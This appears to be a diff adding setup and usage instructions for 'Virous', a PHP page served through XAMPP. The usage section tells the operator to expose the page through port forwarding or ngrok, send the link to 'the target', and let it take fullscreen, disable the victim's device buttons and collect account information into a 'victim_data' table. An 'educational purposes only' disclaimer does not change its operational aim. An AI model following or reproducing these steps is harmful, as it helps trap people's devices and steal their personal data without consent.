@@ -1,0 +1,81 @@
+INSTRUCTIONS FOR USING VIROUS
+==========================
+
+This file contains instructions on how to set up and use the Virous project.
+
+SETUP INSTRUCTIONS:
+-----------------
+
+1. Make sure you have XAMPP installed on your computer
+   - Download from: https://www.apachefriends.org/download.html if you don't have it
+
+2. Start Apache and MySQL services from XAMPP Control Panel
+
+3. Set up the database:
+   - Open phpMyAdmin (http://localhost/phpmyadmin)
+   - Create a new database named "virous_data"
+   - Import the virous_data.sql file
+   - Or run the SQL commands manually from the file
+
+4. Test the setup:
+   - Open http://localhost/virous/play_virous.php in your browser
+   - You should see a loading screen with a progress bar
+
+USAGE INSTRUCTIONS:
+-----------------
+
+1. To create a link that you can send to someone:
+   - Make sure your computer is accessible from the internet
+   - You may need to set up port forwarding on your router to port 80
+   - Or use a service like ngrok (https://ngrok.com/) to create a tunnel
+
+2. Get your public IP address or domain:
+   - Visit https://whatismyip.com/ to find your public IP
+   - Or use your domain name if you have one
+
+3. Create the link:
+   - The link will be: http://YOUR_IP_OR_DOMAIN/virous/play_virous.php
+   - Send this link to the target
+
+4. When the target opens the link on their mobile device:
+   - The page will request fullscreen access
+   - It will disable device buttons and prevent normal navigation
+   - It will attempt to collect account information and other data
+   - All collected data will be sent back to your database
+
+5. View collected data:
+   - Open phpMyAdmin (http://localhost/phpmyadmin)
+   - Select the "virous_data" database
+   - Browse the "victim_data" table
+   - All collected information will be stored here
+
+IMPORTANT NOTES:
+--------------
+
+1. This tool is for educational purposes only
+
+2. Using this to collect data without consent is illegal in most jurisdictions
+
+3. The effectiveness of button/screen disabling varies by device and browser
+
+4. Modern browsers have security measures that prevent many of these techniques
+
+5. Some features may not work on all devices or browsers
+
+TROUBLESHOOTING:
+--------------
+
+1. If the database connection fails:
+   - Check that MySQL is running
+   - Verify database credentials in play_virous.php
+   - Make sure the virous_data database exists
+
+2. If the page doesn't load properly:
+   - Check that Apache is running
+   - Verify file permissions
+   - Check browser console for JavaScript errors
+
+3. If data isn't being collected:
+   - Modern browsers block many data collection methods
+   - The user may have denied permissions
+   - Check browser console for errors
